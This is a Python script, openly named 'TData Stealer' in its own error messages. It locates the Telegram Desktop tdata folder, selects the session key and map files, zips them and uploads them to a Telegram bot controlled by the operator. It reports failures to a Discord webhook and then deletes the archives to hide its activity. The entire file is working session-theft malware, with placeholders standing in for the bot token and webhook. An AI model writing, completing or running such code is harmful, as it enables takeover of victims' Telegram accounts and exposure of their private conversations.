import os
import zipfile
import tempfile
import asyncio
import gc
import time
from aiogram import Bot
from aiogram.types import FSInputFile
import requests

BOT_TOKEN = "BOT_TOKEN"
USER_ID = 0
MAX_FILE_SIZE = 40 * 1024 * 1024
DISCORD_WEBHOOK_URL = "DISCORD_WEBHOOK_URL"

def send_error_to_discord(error_message):
    payload = {
        "content": f"Ошибка в TData Stealer: {error_message}"
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
    except:
        pass

def find_tdata_folder():
    path = os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata")
    return path if os.path.isdir(path) else None

def get_file_size(file_path):
    try:
        return os.path.getsize(file_path)
    except OSError:
        return 0

def is_essential_file(filename, filepath):
    essential_patterns = [
        'key_datas',
        'key_data',
        'settings',
        'maps',
        'usertag',
    ]
    
    exclude_patterns = [
        'cache',
        'temp',
        'media_cache',
        'stickers',
        'thumbnails',
        'downloads',
        'user_photos',
        'saved',
        'emoji',
        'export',
        '.lock',
        '.binlog',
        '.journal',
        '.temp',
        '.tmp'
    ]
    
    filename_lower = filename.lower()
    
    for pattern in exclude_patterns:
        if pattern in filename_lower:
            return False
    
    if get_file_size(filepath) > 5 * 1024 * 1024:
        return False
    
    for pattern in essential_patterns:
        if pattern in filename_lower:
            return True
    
    if filename.isdigit() and len(filename) <= 16:
        return True
    
    if filename_lower.endswith(('s', 'map', 'data')) and get_file_size(filepath) < 1024 * 1024:
        return True
    
    return False

def create_minimal_archives(src_dir, output_dir):
    archives = []
    current_archive_index = 1
    current_archive_size = 0
    current_files = []
    
    essential_files = []
    
    for root, _, files in os.walk(src_dir):
        for filename in files:
            filepath = os.path.join(root, filename)
            
            if is_essential_file(filename, filepath):
                rel_path = os.path.relpath(filepath, src_dir)
                file_size = get_file_size(filepath)
                essential_files.append((filepath, rel_path, file_size))
    
    essential_files.sort(key=lambda x: (x[2], x[1]))
    
    for filepath, rel_path, file_size in essential_files:
        if current_archive_size + file_size > MAX_FILE_SIZE and current_files:
            archive_path = create_archive(output_dir, current_archive_index, current_files, src_dir)
            if archive_path:
                archives.append(archive_path)
            
            current_archive_index += 1
            current_files = []
            current_archive_size = 0
        
        current_files.append((filepath, rel_path))
        current_archive_size += file_size
    
    if current_files:
        archive_path = create_archive(output_dir, current_archive_index, current_files, src_dir)
        if archive_path:
            archives.append(archive_path)
    
    return archives

def create_archive(output_dir, index, files, src_dir):
    archive_path = os.path.join(output_dir, f"tdata.zip")
    
    try:
        with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
            for filepath, rel_path in files:
                try:
                    zipf.write(filepath, rel_path)
                except (PermissionError, OSError):
                    continue
        
        if get_file_size(archive_path) > MAX_FILE_SIZE:
            return None
        
        return archive_path
    except Exception as e:
        send_error_to_discord(str(e))
        return None

async def send_and_cleanup(zip_paths):
    bot = Bot(token=BOT_TOKEN)
    
    try:
        for i, zip_path in enumerate(zip_paths):
            file_size_mb = get_file_size(zip_path) / 1024 / 1024
            
            if file_size_mb > 50:
                continue
            
            try:
                document = FSInputFile(zip_path)
                await bot.send_document(
                    USER_ID,
                    document,
                    caption=f"Tdata - Part {i+1}/{len(zip_paths)} ({file_size_mb:.1f}MB)"
                )
                
                if i < len(zip_paths) - 1:
                    await asyncio.sleep(2)
                    
            except Exception as e:
                send_error_to_discord(str(e))
                continue
                
    except Exception as e:
        send_error_to_discord(str(e))
    finally:
        await bot.session.close()
        gc.collect()
        
        for zip_path in zip_paths:
            try:
                if os.path.exists(zip_path):
                    time.sleep(0.5)
                    os.remove(zip_path)
            except OSError as e:
                send_error_to_discord(f"Could not remove {os.path.basename(zip_path)}: {e}")

async def main():
    tdata = find_tdata_folder()
    if not tdata:
        send_error_to_discord("TData folder not found")
        return
    
    with tempfile.TemporaryDirectory() as temp_dir:
        try:
            zip_files = create_minimal_archives(tdata, temp_dir)
            
            if not zip_files:
                send_error_to_discord("No ZIP files created")
                return
            
            await send_and_cleanup(zip_files)
            
        except Exception as e:
            send_error_to_discord(str(e))

if __name__ == "__main__":
    asyncio.run(main())
